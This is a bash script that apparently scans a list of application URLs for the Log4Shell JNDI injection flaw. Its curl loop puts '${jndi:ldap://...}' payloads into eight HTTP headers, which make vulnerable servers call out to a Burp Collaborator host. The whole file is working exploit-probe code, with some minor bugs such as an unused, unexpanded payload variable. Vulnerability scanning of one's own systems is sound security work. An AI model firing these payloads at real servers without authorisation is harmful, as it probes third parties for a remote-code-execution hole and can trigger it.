#!/bin/bash
# company.txt can contains list of application urls
filename='company.txt'

#collaborator url can be given to check incoming requests
outboundservice='test.burpcollaborator.net'
payload='jndi:ldap://$outboundservice/a'
n=1
while read line; do
# reading each line

url="$line"
file=$(basename $url)

#curl request with various headers and appropriate payloads

response=$(curl $url -H 'User-Agent:${jndi:ldap://'$outboundservice'/a}' -H 'X-Api-Version:${jndi:ldap://'$outboundservice'/a}' -H 'X-forwarded-For:${jndi:ldap://'$outboundservice'/a}' -H 'Referer:${jndi:ldap://'$outboundservice'/a}' -H 'Originating-IP:${jndi:ldap://'$outboundservice'/a}' -H 'Forwarded:${jndi:ldap://'$outboundservice'/a}' -H 'Client-IP:${jndi:ldap://'$outboundservice'/a}' -H 'X-Client-IP:${jndi:ldap://'$outboundservice'/a}')
printf "$response"


n=$((n+1))
done < $filename
